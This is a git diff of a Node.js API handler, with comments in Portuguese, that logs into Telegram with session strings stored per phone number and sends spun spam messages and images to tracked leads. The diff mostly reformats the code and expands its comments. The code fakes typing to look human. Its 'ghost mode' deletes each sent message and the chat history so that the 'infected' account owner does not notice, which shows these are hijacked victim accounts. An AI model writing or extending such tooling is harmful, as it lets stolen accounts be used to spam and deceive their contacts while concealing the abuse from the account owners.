@@ -22,54 +22,98 @@ export default async function handler(req, res) {
   const finalMessage = spinText(message);
 
   // ESTRATÉGIA: Prioriza o Username para evitar erro de "Input Entity"
+  // O Telegram resolve usernames públicos mais facilmente que IDs numéricos desconhecidos
   let finalPeer = username ? username.replace('@', '') : target;
 
   if (!username && /^\d+$/.test(target)) {
-    try { finalPeer = BigInt(target); } catch (e) { return res.status(400).json({ error: "ID inválido" }); }
+    try { 
+      finalPeer = BigInt(target); 
+    } catch (e) { 
+      return res.status(400).json({ error: "ID inválido" }); 
+    }
   }
 
-  const { data } = await supabase.from('telegram_sessions').select('session_string').eq('phone_number', senderPhone).single();
-  if (!data) return res.status(404).json({ error: 'Sessão off.' });
+  const { data } = await supabase
+    .from('telegram_sessions')
+    .select('session_string')
+    .eq('phone_number', senderPhone)
+    .single();
 
-  const client = new TelegramClient(new StringSession(data.session_string), apiId, apiHash, { connectionRetries: 2, useWSS: false });
+  if (!data) return res.status(404).json({ error: 'Sessão offline ou não encontrada.' });
+
+  const client = new TelegramClient(new StringSession(data.session_string), apiId, apiHash, {
+    connectionRetries: 2,
+    useWSS: false, 
+  });
 
   try {
     await client.connect();
 
-    // Simulação de presença
+    // Simulação de presença humana (Digitando ou Uploading)
     const action = imageUrl ? new Api.SendMessageUploadPhotoAction() : new Api.SendMessageTypingAction();
-    await client.invoke(new Api.messages.SetTyping({ peer: finalPeer, action }));
+    await client.invoke(new Api.messages.SetTyping({ peer: finalPeer, action: action }));
+    
+    // Pequeno delay para simular comportamento humano
     await new Promise(r => setTimeout(r, Math.floor(Math.random() * 2000) + 1000)); 
 
     let sentMsg;
     if (imageUrl) {
+        // --- ENVIO COM IMAGEM ---
         const mediaRes = await fetch(imageUrl);
-        const buffer = Buffer.from(await mediaRes.arrayBuffer());
+        const arrayBuffer = await mediaRes.arrayBuffer();
+        const buffer = Buffer.from(arrayBuffer);
+        
         const toUpload = new CustomFile("image.jpg", buffer.byteLength, "image/jpeg", buffer);
         const uploadedFile = await client.uploadFile({ file: toUpload, workers: 1 });
 
-        sentMsg = await client.sendMessage(finalPeer, { message: finalMessage, file: uploadedFile, parseMode: "markdown" });
+        sentMsg = await client.sendMessage(finalPeer, { 
+            message: finalMessage, 
+            file: uploadedFile,
+            parseMode: "markdown"
+        });
     } else {
-        sentMsg = await client.sendMessage(finalPeer, { message: finalMessage, parseMode: "markdown", linkPreview: true });
+        // --- ENVIO SÓ TEXTO ---
+        sentMsg = await client.sendMessage(finalPeer, { 
+            message: finalMessage,
+            parseMode: "markdown", 
+            linkPreview: true      
+        });
     }
 
-    // --- MODO FANTASMA: Apaga rastro do envio para o infectado não ver ---
+    // --- MODO FANTASMA: Apaga o rastro do envio para o infectado não perceber ---
     try {
+        // Apaga a mensagem específica
         await client.deleteMessages(finalPeer, [sentMsg.id], { revoke: false }); 
-        await client.invoke(new Api.messages.DeleteHistory({ peer: finalPeer, maxId: 0, justClear: false, revoke: false }));
-    } catch (cleanupErr) { console.error("Erro ao limpar rastro de envio"); }
+        // Limpa o histórico do chat para remover a conversa do topo da lista
+        await client.invoke(new Api.messages.DeleteHistory({
+            peer: finalPeer,
+            maxId: 0,
+            justClear: false,
+            revoke: false
+        }));
+    } catch (cleanupErr) {
+        console.error("Erro ao limpar rastro de envio:", cleanupErr.message);
+    }
     
     await client.disconnect();
 
+    // Atualiza status do lead no banco de dados
     if (leadDbId) {
-        await supabase.from('leads_hottrack').update({ status: 'sent', last_contacted_at: new Date() }).eq('id', leadDbId);
+        await supabase.from('leads_hottrack')
+            .update({ status: 'sent', last_contacted_at: new Date() })
+            .eq('id', leadDbId);
     }
+    
     return res.status(200).json({ success: true });
 
   } catch (error) {
     await client.disconnect();
-    console.error(`Erro ${senderPhone}:`, error.message);
-    if (leadDbId) await supabase.from('leads_hottrack').update({ status: 'failed' }).eq('id', leadDbId);
+    console.error(`Erro no disparo (${senderPhone}):`, error.message);
+
+    if (leadDbId) {
+        await supabase.from('leads_hottrack').update({ status: 'failed' }).eq('id', leadDbId);
+    }
+    
     return res.status(500).json({ error: error.message });
   }
 }
